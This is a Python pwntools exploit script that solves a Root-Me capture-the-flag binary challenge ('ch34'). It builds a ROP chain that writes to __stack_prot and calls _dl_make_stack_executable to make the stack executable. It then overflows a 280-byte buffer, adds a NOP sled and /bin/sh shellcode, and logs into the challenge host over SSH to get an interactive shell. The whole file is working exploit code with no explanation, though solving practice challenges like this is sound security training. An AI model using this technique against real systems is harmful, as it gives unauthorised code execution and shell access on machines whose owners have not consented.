from pwn import *


context.arch = 'amd64'

elf = ELF("ch34")
rop = ROP(elf) # Create ROP chain
rop.raw(next(elf.search(asm('pop rcx; ret')))) # PUT next value in RCX
rop.raw(7)  # 7 for PROT_
rop.raw(next(elf.search(asm('pop rdx; ret')))) # PUT next value in RDX
rop.raw(elf.symbols['__stack_prot'])            # stack_prot addr
rop.raw(next(elf.search(asm('mov [rdx], rcx; ret;')))) # put 7 for W in rdx
# call funuction with libc_stack_end as rdi
rop.call('_dl_make_stack_executable', [elf.symbols['__libc_stack_end']])
# call stack for our shellcode after
rop.raw(next(elf.search(asm('call rsp'))))
print(rop.dump())

a = b"A" * 280
padd = b"\x90" * 128
payload = a + str(rop).encode() + padd + asm(shellcraft.sh())

s = ssh(host='challenge03.root-me.org', port=2223, user='app-systeme-ch34', password='app-systeme-ch34')
p = s.process(['./ch34'])
p.sendline(payload)
p.interactive()
